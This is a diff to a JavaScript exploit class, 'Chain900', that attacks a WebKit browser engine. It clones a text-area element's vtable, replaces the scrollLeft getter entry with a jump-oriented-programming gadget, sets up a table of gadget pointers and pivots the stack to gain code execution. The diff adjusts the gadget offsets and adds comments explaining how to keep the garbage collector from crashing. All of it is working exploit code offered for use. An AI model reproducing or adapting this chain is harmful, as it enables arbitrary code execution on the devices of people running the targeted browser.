@@ -475,9 +475,14 @@ class Chain900 extends Chain900Base {
     constructor() {
         super();
 
+        // sizeof JSC:JSObject, the JSCell + the butterfly field
         const js_size = 0x10;
+        // sizeof WebCore::JSHTMLTextAreaElement, subclass of JSObject
         const js_ta_size = 0x20;
+        // start of the array of inline properties (JSValues)
         const offset_js_inline_prop = 0x10;
+        // Sizes may vary between webkit versions so we just assume a size
+        // that we think is large enough for all of them.
         const vtable_size = 0x1000;
         const webcore_ta_size = 0x180;
 
@@ -496,6 +501,12 @@ class Chain900 extends Chain900Base {
         );
         this.m_wrapped_clone = m_wrapped_clone;
 
+        // Replicate the vtable as much as possible or else the garbage
+        // collector will crash. It uses functions from the vtable.
+        //
+        // There is no need to restore the original vtable pointer later since
+        // it points to a copy with only offset 0x1c8 changed. The scrollLeft
+        // getter is not used by the GC.
         const vtable_clone = new Uint8Array(
             make_buffer(webcore_ta.readp(0), vtable_size)
         );
@@ -509,19 +520,21 @@ class Chain900 extends Chain900Base {
 
         clone_p.write64(0, ta_p.read64(0));
 
-        // 0x1c8 is the offset of the scrollLeft getter native function
-        rw.write64(vtable_clone, 0x1c8, this.get_gadget(jop1));
+        // 0x1b8 is the offset of the scrollLeft getter native function
+        rw.write64(vtable_clone, 0x1b8, this.get_gadget(jop1));
 
         // for the JOP chain
         const rax_ptrs = new Uint8Array(0x100);
         const rax_ptrs_p = get_view_vector(rax_ptrs);
         this.rax_ptrs = rax_ptrs;
 
-        rw.write64(rax_ptrs, 0x28, this.get_gadget(jop2));
+        //rw.write64(rax_ptrs, 0x28, this.get_gadget(jop2));
+        rw.write64(rax_ptrs, 0x30, this.get_gadget(jop2));
         rw.write64(rax_ptrs, 0x1c, this.get_gadget(jop3));
         rw.write64(rax_ptrs, 0x58, this.get_gadget(jop4));
         rw.write64(rax_ptrs, 0x10, this.get_gadget(jop5));
         rw.write64(rax_ptrs, 0, this.get_gadget(jop6));
+        // value to pivot rsp to
         rw.write64(rax_ptrs, 0x18, this.stack_addr);
 
         const jop_buffer = new Uint8Array(8);
@@ -529,6 +542,7 @@ class Chain900 extends Chain900Base {
         this.jop_buffer = jop_buffer;
 
         rw.write64(jop_buffer, 0, rax_ptrs_p);
+
         clone_p.write64(offset_js_inline_prop + 8*2, jop_buffer_p);
     }
 
